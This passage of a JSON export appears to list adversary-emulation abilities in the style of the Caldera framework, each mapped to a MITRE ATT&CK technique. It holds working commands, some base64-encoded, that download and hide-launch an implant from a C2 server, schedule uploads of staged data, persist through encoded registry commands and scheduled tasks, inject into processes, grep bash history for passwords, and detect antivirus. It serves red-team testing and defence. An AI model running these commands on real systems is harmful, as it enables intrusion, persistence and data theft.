"c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAtSCAiZ29jYXQtZXh0ZW5zaW9uczpnaXN0IiAtSCAiYzI6Z2lzdCIgJHNlcnZlci9maWxlL2Rvd25sb2FkID4gI3thZ2VudHMuaW1wbGFudF9uYW1lfTtjaG1vZCAreCAje2FnZW50cy5pbXBsYW50X25hbWV9Oy4vI3thZ2VudHMuaW1wbGFudF9uYW1lfSAtYzIgR0lTVCAtdg==", "description": "Download with GIST C2"}, {"command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAtSCAiZ29jYXQtZXh0ZW5zaW9uczpwcm94eV9odHRwIiAtSCAiaW5jbHVkZVByb3h5UGVlcnM6SFRUUCIgJHNlcnZlci9maWxlL2Rvd25sb2FkID4gI3thZ2VudHMuaW1wbGFudF9uYW1lfTtjaG1vZCAreCAje2FnZW50cy5pbXBsYW50X25hbWV9Oy4vI3thZ2VudHMuaW1wbGFudF9uYW1lfSAtc2VydmVyICRzZXJ2ZXIgLWxpc3RlblAyUCAtdg==", "description": "Deploy as a P2P agent with known peers included in compiled agent"}], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$server=\"#{app.contact.http}\";\n$url=\"$server/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");\n$data=$wc.DownloadData($url);\nget-process | ? {$_.modules.filename -like \"C:\\Users\\Public\\#{agents.implant_name}.exe\"} | stop-process -f;\nrm -force \"C:\\Users\\Public\\#{agents.implant_name}.exe\" -ea ignore;\n[io.file]::WriteAllBytes(\"C:\\Users\\Public\\#{agents.implant_name}.exe\",$data) | Out-Null;\nStart-Process -FilePath C:\\Users\\Public\\#{agents.implant_name}.exe -ArgumentList \"-server $server -group red\" -WindowStyle hidden;", "language": null, "name": "psh", "variations": [{"command": "JHNlcnZlcj0iaHR0cDovLzAuMC4wLjA6ODg4OCI7JHVybD0iJHNlcnZlci9maWxlL2Rvd25sb2FkIjskd2M9TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudDskd2MuSGVhZGVycy5hZGQoInBsYXRmb3JtIiwid2luZG93cyIpOyR3Yy5IZWFkZXJzLmFkZCgiZmlsZSIsInNhbmRjYXQuZ28iKTskZGF0YT0kd2MuRG93bmxvYWREYXRhKCR1cmwpO2dldC1wcm9jZXNzIHwgPyB7JF8ubW9kdWxlcy5maWxlbmFtZSAtbGlrZSAiQzpcVXNlcnNcUHVibGljXCN7YWdlbnRzLmltcGxhbnRfbmFtZX0uZXhlIn0gfCBzdG9wLXByb2Nlc3MgLWY7cm0gLWZvcmNlICJDOlxVc2Vyc1xQdWJsaWNcI3thZ2VudHMuaW1wbGFudF9uYW1lfS5leGUiIC1lYSBpZ25vcmU7W2lvLmZpbGVdOjpXcml0ZUFsbEJ5dGVzKCJDOlxVc2Vyc1xQdWJsaWNcI3thZ2VudHMuaW1wbGFudF9uYW1lfS5leGUiLCRkYXRhKSB8IE91dC1OdWxsO1N0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoIEM6XFVzZXJzXFB1YmxpY1wje2FnZW50cy5pbXBsYW50X25hbWV9LmV4ZSAtQXJndW1lbnRMaXN0ICItc2VydmVyICRzZXJ2ZXIgLWdyb3VwIGJsdWUiIC1XaW5kb3dTdHlsZSBoaWRkZW47", "description": "Deploy as a blue-team agent instead of red"}, {"command": "JHNlcnZlcj0iaHR0cDovLzAuMC4wLjA6ODg4OCI7JHVybD0iJHNlcnZlci9maWxlL2Rvd25sb2FkIjskd2M9TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudDskd2MuSGVhZGVycy5hZGQoInBsYXRmb3JtIiwid2luZG93cyIpOyR3Yy5IZWFkZXJzLmFkZCgiZmlsZSIsInNhbmRjYXQuZ28iKTskd2MuSGVhZGVycy5hZGQoImdvY2F0LWV4dGVuc2lvbnMiLCAiI3thZ2VudC5leHRlbnNpb25zfSIpOyRkYXRhPSR3Yy5Eb3dubG9hZERhdGEoJHVybCk7Z2V0LXByb2Nlc3MgfCA/IHskXy5tb2R1bGVzLmZpbGVuYW1lIC1saWtlICJDOlxVc2Vyc1xQdWJsaWNcI3thZ2VudHMuaW1wbGFudF9uYW1lfS5leGUifSB8IHN0b3AtcHJvY2VzcyAtZjtybSAtZm9yY2UgIkM6XFVzZXJzXFB1YmxpY1wje2FnZW50cy5pbXBsYW50X25hbWV9LmV4ZSIgLWVhIGlnbm9yZTtbaW8uZmlsZV06OldyaXRlQWxsQnl0ZXMoIkM6XFVzZXJzXFB1YmxpY1wje2FnZW50cy5pbXBsYW50X25hbWV9LmV4ZSIsJGRhdGEpIHwgT3V0LU51bGw7U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggQzpcVXNlcnNcUHVibGljXCN7YWdlbnRzLmltcGxhbnRfbmFtZX0uZXhlIC1Bcmd1bWVudExpc3QgIi1zZXJ2ZXIgJHNlcnZlciAtZ3JvdXAgcmVkIiAtV2luZG93U3R5bGUgaGlkZGVuOw==", "description": "Compile red-team agent with a comma-separated list of extensions (requires GoLang)."}, {"command": "JHNlcnZlcj0iaHR0cDovLzAuMC4wLjA6ODg4OCI7JHVybD0iJHNlcnZlci9maWxlL2Rvd25sb2FkIjskd2M9TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudDskd2MuSGVhZGVycy5hZGQoInBsYXRmb3JtIiwid2luZG93cyIpOyR3Yy5IZWFkZXJzLmFkZCgiZmlsZSIsInNhbmRjYXQuZ28iKTskd2MuSGVhZGVycy5hZGQoImdvY2F0LWV4dGVuc2lvbnMiLCJwcm94eV9odHRwIik7JHdjLkhlYWRlcnMuYWRkKCJpbmNsdWRlUHJveHlQZWVycyIsIkhUVFAiKTskZGF0YT0kd2MuRG93bmxvYWREYXRhKCR1cmwpO2dldC1wcm9jZXNzIHwgPyB7JF8ubW9kdWxlcy5maWxlbmFtZSAtbGlrZSAiQzpcVXNlcnNcUHVibGljXCN7YWdlbnRzLmltcGxhbnRfbmFtZX0uZXhlIn0gfCBzdG9wLXByb2Nlc3MgLWY7cm0gLWZvcmNlICJDOlxVc2Vyc1xQdWJsaWNcI3thZ2VudHMuaW1wbGFudF9uYW1lfS5leGUiIC1lYSBpZ25vcmU7W2lvLmZpbGVdOjpXcml0ZUFsbEJ5dGVzKCJDOlxVc2Vyc1xQdWJsaWNcI3thZ2VudHMuaW1wbGFudF9uYW1lfS5leGUiLCRkYXRhKSB8IE91dC1OdWxsO1N0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoIEM6XFVzZXJzXFB1YmxpY1wje2FnZW50cy5pbXBsYW50X25hbWV9LmV4ZSAtQXJndW1lbnRMaXN0ICItc2VydmVyICRzZXJ2ZXIgLWdyb3VwIHJlZCAtbGlzdGVuUDJQIC12IiAtV2luZG93U3R5bGUgaGlkZGVuOw==", "description": "Deploy as a P2P agent with known peers included in compiled agent"}], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "2f34977d-9558-4c12-abad-349716777c6b", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "Sandcat", "plugin": "sandcat"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use dropped scanner to find open popular ports", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["scanner.py"], "parsers": [{"module": "plugins.stockpile.app.parsers.scan", "parserconfigs": [{"custom_parser_vals": {}, "edge": "has_open_port", "target": "remote.host.port", "source": "remote.host.ip"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "python3 scanner.py -i #{remote.host.ip}", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["scanner.py"], "parsers": [{"module": "plugins.stockpile.app.parsers.scan", "parserconfigs": [{"custom_parser_vals": {}, "edge": "has_open_port", "target": "remote.host.port", "source": "remote.host.ip"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "python3 scanner.py -i #{remote.host.ip}", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Network Service Scanning", "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9", "technique_id": "T1046", "tactic": "discovery", "requirements": [], "name": "Scan IP for ports", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "View all potential WIFI networks on host", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["9f639067-370a-40ba-b7ac-6f1c15d5a158"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["9f639067-370a-40ba-b7ac-6f1c15d5a158"], "parsers": [{"module": "plugins.stockpile.app.parsers.wifipref", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "scan.info"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["28f9bf43-4f14-4965-9bd9-b70fd6993d8e"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": ".\\#{payload:28f9bf43-4f14-4965-9bd9-b70fd6993d8e} -Scan", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Network Configuration Discovery", "ability_id": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9", "technique_id": "T1016", "tactic": "discovery", "requirements": [{"relationship_match": [{"source": "no.logs"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}, {"relationship_match": [{"source": "fw.disabled"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Scan WIFI networks", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This ability exfiltrates the staged directory at a scheduled time.", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/mycron;\ncrontab /tmp/origcron;\nrm /tmp/origcron;"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "crontab -l > /tmp/origcron;\ncrontab -l > /tmp/mycron;\necho \"0 12 * * * curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\" >> /tmp/mycron;\ncrontab /tmp/mycron;", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["Unregister-ScheduledTask -TaskName \"Scheduled exfiltration\" -Confirm:$false;"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$commandString = '$fieldName = \\\"#{host.dir.compress}\";\n$filePath = \\\"#{host.dir.compress}\";\n$url = \\\"#{server}/file/upload\\\";\nAdd-Type -AssemblyName \\\"System.Net.Http\\\";\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n\n$xRequestIdHeader = \\\"X-Request-Id\\\";\n$xRequestIdField = $env:COMPUTERNAME + \\\"-#{paw}\\\";\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add($xRequestIdHeader, $xRequestIdField);\n\n$userAgentHeader = \\\"User-Agent\\\";\n$userAgentField = \\\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\\\";\n$client.DefaultRequestHeaders.Add($userAgentHeader, $userAgentField);\n$result = $client.PostAsync($url, $content).Result;$result.EnsureSuccessStatusCode();';\n\n$action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"$commandString\";\n$trigger = New-ScheduledTaskTrigger -Once -At 12pm;\n\nRegister-ScheduledTask -TaskName \"Scheduled exfiltration\" -Trigger $trigger -Action $action;", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Scheduled Transfer", "ability_id": "110cea7a-5b03-4443-92ee-7ccefaead451", "technique_id": "T1029", "tactic": "exfiltration", "requirements": [], "name": "Scheduled Exfiltration", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "A Base64 Encoded command will be stored in the registry (ping 127.0.0.1) and then a scheduled task will be created.\nThe scheduled task will launch powershell to decode and run the command in the registry daily.\nThis is a persistence mechanism recently seen in use by Qakbot.  \n\n[Additiona Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["schtasks /delete /tn \"ATOMIC-T1053.005\" /F >nul 2>&1 && reg delete HKCU\\SOFTWARE\\ATOMIC-T1053.005 /F >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f && schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st 07:45", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Scheduled Task/Job: Scheduled Task", "ability_id": "469f554b1c5e8613d3ec3662e9d9e3e1", "technique_id": "T1053.005", "tactic": "multiple", "requirements": [], "name": "Scheduled Task Executing Base64 Encoded Commands From Registry", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view\nthe tasks, open the Task Scheduler and look in the Active Tasks pane.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["schtasks /delete /tn \"T1053_005_OnLogon\" /f >nul 2>&1 && schtasks /delete /tn \"T1053_005_OnStartup\" /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "schtasks /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\" && schtasks /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Scheduled Task/Job: Scheduled Task", "ability_id": "5db2884b6ca3ab932848f295a3896dc0", "technique_id": "T1053.005", "tactic": "multiple", "requirements": [], "name": "Scheduled Task Startup Script", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["SCHTASKS /Delete /TN spawn /F >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "SCHTASKS /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST 20:10", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Scheduled Task/Job: Scheduled Task", "ability_id": "2e91cc775c1137720e978b906e2396fe", "technique_id": "T1053.005", "tactic": "multiple", "requirements": [], "name": "Scheduled task Local", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Create a task on a remote system.\nUpon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["SCHTASKS /Delete /S localhost /U DOMAIN\\user /P At0micStrong /TN \"Atomic task\" /F >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "SCHTASKS /Create /S localhost /RU DOMAIN\\user /RP At0micStrong /TN \"Atomic task\" /TR \"C:\\windows\\system32\\cmd.exe\" /SC daily /ST 20:10", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Scheduled Task/Job: Scheduled Task", "ability_id": "fcbd91ebc012731e51a8d79264d49531", "technique_id": "T1053.005", "tactic": "multiple", "requirements": [], "name": "Scheduled task Remote", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "capture the contents of the screen", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.screenshot.png"}]}], "cleanup": ["for i in {1..5}; do /bin/rm screen-$i.png; done;"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "for i in {1..5}; do screencapture -t png screen-$i.png; echo \"$(cd \"$(dirname \"$1\")\"; pwd -P)/$(basename \"screen-$i.png\")\"; sleep 5; done;", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.screenshot.png"}]}], "cleanup": ["$filePath = \"$HOME\\Desktop\\screenshot.png\"; if (Test-Path -Path $filePath) { del $filePath; };"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$loadResult = [Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\");\nfunction screenshot([Drawing.Rectangle]$bounds, $path) {\n   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;\n   $graphics = [Drawing.Graphics]::FromImage($bmp);\n   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);\n   $bmp.Save($path);\n   $graphics.Dispose();\n   $bmp.Dispose();\n}\nif ($loadResult) {\n  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);\n  $dest = \"$HOME\\Desktop\\screenshot.png\";\n  screenshot $bounds $dest;\n  if (Test-Path -Path $dest) {\n    $dest;\n    exit 0;\n  };\n};\nexit 1;", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.screenshot.png"}]}], "cleanup": ["$filePath = \"$HOME\\Desktop\\screenshot.png\"; if (Test-Path -Path $filePath) { del $filePath; };"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$loadResult = [Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\");\nfunction screenshot([Drawing.Rectangle]$bounds, $path) {\n   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;\n   $graphics = [Drawing.Graphics]::FromImage($bmp);\n   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);\n   $bmp.Save($path);\n   $graphics.Dispose();\n   $bmp.Dispose();\n}\nif ($loadResult) {\n  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);\n  $dest = \"$HOME\\Desktop\\screenshot.png\";\n  screenshot $bounds $dest;\n  if (Test-Path -Path $dest) {\n    $dest;\n    exit 0;\n  };\n};\nexit 1;", "language": null, "name": "pwsh", "variations": [], "uploads": []}], "technique_name": "Screen Capture", "ability_id": "316251ed-6a28-4013-812b-ddf5b5b007f8", "technique_id": "T1113", "tactic": "collection", "requirements": [], "name": "Screen Capture", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may attempt to trick the user into downloading ScreenConnect for use as a C2 channel. Download of ScreenConnect installer will be in the Downloads directory.\nMsiexec will be used to quietly insall ScreenConnect.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$installer = \"C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi\"; msiexec /x $installer /qn"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$installer = \"C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi\"; Invoke-WebRequest -OutFile $installer \"https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi\"; msiexec /i $installer /qn", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote Access Software", "ability_id": "9332aff267b00ede37b09606340ee1dc", "technique_id": "T1219", "tactic": "command-and-control", "requirements": [], "name": "ScreenConnect Application Download and Install on Windows", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use screencapture command to collect a full desktop screenshot\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/T1113_desktop.png"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "screencapture /tmp/T1113_desktop.png", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Screen Capture", "ability_id": "ee00df65dba6910c97e7d910b948c6c5", "technique_id": "T1113", "tactic": "collection", "requirements": [], "name": "Screencapture", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use screencapture command to collect a full desktop screenshot\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/T1113_desktop.png"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "screencapture -x /tmp/T1113_desktop.png", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Screen Capture", "ability_id": "67a99afec9b560aa2b636e6d74c765f1", "technique_id": "T1113", "tactic": "collection", "requirements": [], "name": "Screencapture (silent)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Search through bash history for specifice commands we want to capture\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > ~/loot.txt", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > ~/loot.txt", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Bash History", "ability_id": "7784d702d69cb5219ff8fa6177b3ad81", "technique_id": "T1552.003", "tactic": "credential-access", "requirements": [], "name": "Search Through Bash History", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test uses `grep` to search a macOS Safari binaryCookies file for specified values. This was used by CookieMiner malware.\n\nUpon successful execution, MacOS shell will cd to `~/Libraries/Cookies` and grep for `Cookies.binarycookies`.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "cd ~/Library/Cookies; grep -q \"coinbase\" \"Cookies.binarycookies\"", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores: Credentials from Web Browsers", "ability_id": "8a3763d7c08e9865d77f96d033716d1c", "technique_id": "T1555.003", "tactic": "credential-access", "requirements": [], "name": "Search macOS Safari Cookies", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test creates a section object in the local process followed by a local section view.\nThe shellcode is copied into the local section view and a remote section view is created in the target process, pointing to the local section view. \nA thread is then created in the target process, using the remote section view as start address.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["b170a0_InjectView.exe"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Stop-Process $notepad.pid"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$notepad = Start-Process notepad -passthru; Start-Process b170a0_InjectView.exe", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Process Injection", "ability_id": "5fef3e10a3e1113d7d31a26c03c5117a", "technique_id": "T1055", "tactic": "multiple", "requirements": [], "name": "Section View Injection", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, the test is going to display running processes, firewall configuration on network profiles\nand specific security software.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "netsh.exe advfirewall  show allprofiles && tasklist.exe && tasklist.exe | findstr /i virus && tasklist.exe | findstr /i cb && tasklist.exe | findstr /i defender && tasklist.exe | findstr /i cylance && tasklist.exe | findstr /i mc && tasklist.exe | findstr /i \"virus cb defender cylance mc\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Software Discovery: Security Software Discovery", "ability_id": "301c21998e9aac686942a33d328248e7", "technique_id": "T1518.001", "tactic": "discovery", "requirements": [], "name": "Security Software Discovery", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Discovery of installed antivirus products via a WMI query.\n\nwhen sucessfully executed, the test is going to display installed AV software.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wmic.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Software Discovery: Security Software Discovery", "ability_id": "76147189e1a5880afa047d0869cf6d17", "technique_id": "T1518.001", "tactic": "discovery", "requirements": [], "name": "Security Software Discovery - AV Discovery via WMI", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Discovery of an installed Sysinternals Sysmon service using driver altitude (even if the name is changed).\n\nwhen sucessfully executed, the test is going to display sysmon driver instance if it is installed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "fltmc.exe | findstr.exe 385201", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Software Discovery: Security Software Discovery", "ability_id": "33a24ff44719e6ac0614b58f8c9a7c72", "technique_id": "T1518.001", "tactic": "discovery", "requirements": [], "name": "Security Software Discovery - Sysmon Service", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, powershell is going to processes related AV products if they are running.\nNote that, depending on the privilege of current user, get-process | ?{$_.Description -like \"*\"} may not return the processes related to AV products of the check.\nFor instance, only with Administrator right, you can see the process description of McAffee processes. Hence, it is better to use get-process | ?{$_.ProcessName -like \"*\"},\nif you know the name of those processes.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "get-process | ?{$_.Description -like \"*virus*\"}; get-process | ?{$_.Description -like \"*carbonblack*\"}; get-process | ?{$_.Description -like \"*defender*\"}; get-process | ?{$_.Description -like \"*cylance*\"}; get-process | ?{$_.Description -like \"*mc*\"}; get-process | ?{$_.ProcessName -like \"*mc*\"}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Software Discovery: Security Software Discovery", "ability_id": "ed77c603f0d7c1fe3b19a9d4d9701158", "technique_id": "T1518.001", "tactic": "discovery", "requirements": [], "name": "Security Software Discovery - powershell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Methods to identify Security Software on an endpoint\nwhen sucessfully executed, command shell  is going to display AV/Security software it is running.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "ps aux | egrep 'falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd'", "language": null, "name": "sh", "variations": [], 